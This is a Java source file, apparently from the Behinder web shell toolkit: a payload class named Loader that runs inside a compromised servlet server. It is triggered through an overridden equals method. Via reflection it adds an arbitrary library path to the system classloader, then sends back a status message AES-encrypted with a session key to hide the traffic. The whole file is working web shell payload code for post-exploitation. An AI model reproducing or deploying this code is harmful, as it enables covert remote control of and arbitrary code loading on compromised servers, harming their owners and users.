package net.rebeyond.behinder.payload.java;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.io.File;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class Loader {
    public static String libPath;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;

    public Loader() {
    }

    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        HashMap result = new HashMap();

        try {
            URL url = (new File(libPath)).toURI().toURL();
            URLClassLoader urlClassLoader = (URLClassLoader) ClassLoader.getSystemClassLoader();
            Method add = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
            add.setAccessible(true);
            add.invoke(urlClassLoader, url);
            result.put("status", "success");
        } catch (Exception var8) {
            result.put("status", "fail");
            result.put("msg", var8.getMessage());
        }

        try {
            ServletOutputStream so = this.Response.getOutputStream();
            so.write(this.Encrypt(this.buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
            so.flush();
            so.close();
            page.getOut().clear();
        } catch (Exception var7) {
            var7.printStackTrace();
        }

        return true;
    }

    private String buildJsonArray(List list, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        sb.append("[");

        for (Object o : list) {
            Map entity = (Map) o;
            sb.append(this.buildJson(entity, encode) + ",");
        }

        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }

        sb.append("]");
        return sb.toString();
    }

    private String buildJson(Map entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");

        for (Object o : entity.keySet()) {
            String key = (String) o;
            sb.append("\"" + key + "\":\"");
            String value = ((String) entity.get(key));
            if (encode) {
                Class Base64;
                Object Encoder;
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    Base64 = Class.forName("java.util.Base64");
                    Encoder = Base64.getMethod("getEncoder", (Class[]) null).invoke(Base64, (Object[]) null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                } else {
                    this.getClass();
                    Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Encoder = Base64.newInstance();
                    value = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                    value = value.replace("\n", "").replace("\r", "");
                }
            }

            sb.append(value);
            sb.append("\",");
        }

        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }

        sb.append("}");
        return sb.toString();
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        String key = this.Session.getAttribute("u").toString();
        byte[] raw = key.getBytes(StandardCharsets.UTF_8);
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }
}
